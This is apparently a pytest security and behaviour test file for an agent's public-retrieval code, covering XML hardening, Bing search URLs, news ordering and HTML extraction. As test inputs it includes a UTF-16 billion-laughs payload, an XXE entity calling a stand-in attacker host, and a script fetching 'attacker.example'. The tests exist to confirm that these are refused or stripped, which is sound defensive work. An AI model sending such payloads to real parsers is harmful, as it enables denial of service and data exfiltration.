"""Behavior and security tests for controller-owned public retrieval.

These target consumer-visible boundaries of the retrieval layer: hardened
XML parsing (regardless of encoding), the real general web endpoint with
well-formed request URLs, newest-first news ordering before the result cap,
and case-preserving HTML text extraction. No network access happens in this
suite: HTTP transport itself is exercised by the witnessed smokes.
"""

import pytest

from oi_agent.external.records import EvidenceItem
from oi_agent.external.retrieval import (
    _WEB_ENDPOINT,
    RetrievalError,
    _parse_rss,
    html_to_text,
    parse_hardened_xml,
)

RETRIEVED_AT = "2026-10-10T00:00:00+00:00"


def _feed(items: str) -> bytes:
    """Wrap item XML in a minimal RSS 2.0 envelope."""
    return (
        "<?xml version=\"1.0\"?>"
        "<rss version=\"2.0\"><channel>"
        f"{items}"
        "</channel></rss>"
    ).encode("utf-8")


def _item(title: str, link: str, pub: str | None = None, description: str = "") -> str:
    pub_tag = f"<pubDate>{pub}</pubDate>" if pub else ""
    return (
        f"<item><title>{title}</title>"
        f"<link>{link}</link>{pub_tag}"
        f"<description>{description}</description></item>"
    )


# --- correction 2: hardened XML regardless of encoding -----------------------


def test_utf16_entity_expansion_is_refused_not_expanded():
    """A UTF-16 billion-laughs document is refused; no expanded text survives.

    The parent proved the previous ASCII byte-regex prefilter was bypassed by
    UTF-16 XML and the entity text came back expanded. defusedxml must reject
    the DTD/entities whatever the declared encoding.
    """
    attack = (
        "<?xml version=\"1.0\" encoding=\"UTF-16\"?>"
        "<!DOCTYPE rss [<!ENTITY a \"AAAAAAA\">"
        "<!ENTITY b \"&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;\">]>"
        "<rss><channel><item><title>&b;</title>"
        "<link>https://example.com/a</link></item></channel></rss>"
    )
    payload = attack.encode("utf-16")
    with pytest.raises(RetrievalError) as excinfo:
        parse_hardened_xml(payload)
    assert excinfo.value.category == "feed_declares_dtd"


def test_external_entity_reference_is_refused_without_network():
    """An XXE document pointing at an external URL is refused."""
    attack = (
        "<?xml version=\"1.0\"?>"
        "<!DOCTYPE rss [<!ENTITY xxe SYSTEM \"https://attacker.invalid/collect\">]>"
        "<rss><channel><item><title>&xxe;</title>"
        "<link>https://example.com/a</link></item></channel></rss>"
    ).encode("utf-8")
    with pytest.raises(RetrievalError) as excinfo:
        parse_hardened_xml(attack)
    assert excinfo.value.category == "feed_declares_dtd"


def test_utf16_wellformed_feed_parses():
    """Encoding declarations alone are not suspicious; a clean feed parses."""
    feed = (
        "<?xml version=\"1.0\" encoding=\"UTF-16\"?>"
        "<rss version=\"2.0\"><channel><item>"
        "<title>Clean UTF-16</title><link>https://example.com/a</link>"
        "</item></channel></rss>"
    ).encode("utf-16")
    root = parse_hardened_xml(feed)
    assert root.find("channel/item/title").text == "Clean UTF-16"


def test_malformed_xml_reports_bounded_category():
    """Garbage that is not XML at all fails with the bounded category."""
    with pytest.raises(RetrievalError) as excinfo:
        parse_hardened_xml(b"< this is not xml")
    assert excinfo.value.category == "feed_unparseable"


# --- correction 3: real general web endpoint ---------------------------------


def test_web_endpoint_is_general_search_not_news_wrapper():
    """The web vertical must use the Bing RSS endpoint, not Google News."""
    assert _WEB_ENDPOINT == "https://www.bing.com/search"


def test_web_search_request_carries_format_param_once(monkeypatch):
    """Bing's format=rss rides in the same query string as the topic."""
    from oi_agent.external import retrieval

    captured: dict = {}

    async def fake_fetch(url: str):
        captured["url"] = url
        return retrieval.FetchedDocument(
            url=url,
            final_url=url,
            content_type="application/xml",
            text="",
            truncated=False,
            raw=_feed(_item("Result", "https://www.python.org/downloads/")),
        )

    monkeypatch.setattr(retrieval, "fetch_public_document", fake_fetch)
    import asyncio

    items = asyncio.run(retrieval.search_web("python release"))
    assert items, "web results expected"
    url = captured["url"]
    assert url.startswith("https://www.bing.com/search?")
    assert url.count("?") == 1, "endpoint params must merge, not add a second ?"
    assert "format=rss" in url
    assert "q=python+release" in url


def test_web_results_carry_publisher_provenance_and_bounded_description(monkeypatch):
    """A web result cites the RESULT host, never Bing, and keeps its snippet."""
    from oi_agent.external import retrieval

    snippet = "&lt;b&gt;Python 3.14&lt;/b&gt; is the newest release of the Python language."
    raw = _feed(
        _item(
            "Python 3.14 released",
            "https://www.python.org/downloads/",
            "Tue, 07 Oct 2025 10:00:00 GMT",
            snippet,
        )
    )

    async def fake_fetch(url: str):
        return retrieval.FetchedDocument(
            url=url, final_url=url, content_type="application/xml",
            text="", truncated=False, raw=raw,
        )

    monkeypatch.setattr(retrieval, "fetch_public_document", fake_fetch)
    import asyncio

    items = asyncio.run(retrieval.search_web("python release", limit=5))
    assert len(items) == 1
    assert items[0].source_name == "www.python.org"
    assert "Python 3.14" in items[0].text
    assert "python.org" not in items[0].url or "bing" not in items[0].url
    assert items[0].published_at is not None


# --- correction 4: sort by publication time BEFORE the cap -------------------


def test_news_items_are_newest_first_before_cap():
    """Feed order must not hide fresh news behind stale items."""
    raw = _feed(
        _item("Old", "https://a.example.com/1", "Mon, 01 Jan 2024 00:00:00 GMT")
        + _item("Fresh", "https://b.example.com/2", "Wed, 08 Oct 2025 00:00:00 GMT")
        + _item("Middle", "https://c.example.com/3", "Sat, 01 Feb 2025 00:00:00 GMT")
    )
    items = _parse_rss(raw, kind="news", limit=2, retrieved_at=RETRIEVED_AT)
    assert [item.title for item in items] == ["Fresh", "Middle"]
    assert all(item.published_at for item in items)


def test_undated_items_sort_last_and_state_the_limitation():
    """Unknown publication times are explicit and never disguise themselves."""
    raw = _feed(
        _item("Undated", "https://a.example.com/1")
        + _item("Dated", "https://b.example.com/2", "Mon, 01 Jan 2024 00:00:00 GMT")
    )
    items = _parse_rss(raw, kind="news", limit=2, retrieved_at=RETRIEVED_AT)
    assert [item.title for item in items] == ["Dated", "Undated"]
    assert any("publication time" in note for note in items[1].limitations)


def test_result_cap_applies_after_sorting_not_during_parse():
    """The cap keeps the NEWEST items, not the first ones in feed order."""
    items_xml = "".join(
        _item(f"Item{i}", f"https://host{i}.example.com/{i}",
              f"Mon, 0{(i % 9) + 1} Jan 202{i} 00:00:00 GMT")
        for i in range(1, 6)
    )
    items = _parse_rss(_feed(items_xml), kind="news", limit=2, retrieved_at=RETRIEVED_AT)
    assert len(items) == 2
    times = [item.published_at for item in items]
    assert times == sorted(times, reverse=True)


# --- correction 4: case-preserving linear HTML extraction --------------------


def test_html_extraction_preserves_publisher_case():
    """Evidence text keeps the published case; no blanket lowercasing."""
    markup = (
        "<html><head><title>ignored</title></head><body>"
        "<h1>Python Releases</h1>"
        "<p>FastAPI 0.141 adds StreamingResponse fixes.</p>"
        "</body></html>"
    )
    text = html_to_text(markup)
    assert "Python Releases" in text
    assert "FastAPI 0.141 adds" in text
    assert "ignored" not in text


def test_html_extraction_drops_script_and_style_content():
    """Script/style bodies never reach the model as page text."""
    markup = (
        "<html><head><style>.a{color:red}</style>"
        "<script>var token = 'secret-value';</script></head>"
        "<body><p>Visible content</p>"
        "<script>fetch('//attacker.example')</script></body></html>"
    )
    text = html_to_text(markup)
    assert "Visible content" in text
    assert "secret-value" not in text
    assert "attacker.example" not in text
    assert "color:red" not in text


def test_aggregator_wrapper_html_is_never_attributed_to_publisher(monkeypatch):
    """A fetch that never leaves the news wrapper stays headline-only."""
    from oi_agent.external.prepare import _attach_article_excerpt
    from oi_agent.external.records import PreparedInputs

    headline = EvidenceItem(
        kind="news",
        title="Headline",
        url="https://news.google.com/rss/articles/wrapper",
        source_name="The Publisher",
        retrieved_at=RETRIEVED_AT,
        published_at="2026-10-01T00:00:00+00:00",
        text="",
        limitations=("headline only; article body not fetched",),
    )

    class FakeDocument:
        final_url = "https://news.google.com/rss/articles/wrapper"
        text = "Google consent wrapper HTML that is NOT the article."

    async def fake_fetch(url: str):
        return FakeDocument()

    from oi_agent.external import prepare

    monkeypatch.setattr(prepare, "fetch_public_document", fake_fetch)
    inputs = PreparedInputs()
    inputs.evidence.extend([headline])

    import asyncio
    from types import SimpleNamespace

    asyncio.run(_attach_article_excerpt(SimpleNamespace(inputs=inputs), [headline]))
    assert inputs.evidence[0].text == ""
    assert inputs.evidence[0].url == headline.url
    assert "headline only" in inputs.evidence[0].limitations[0]
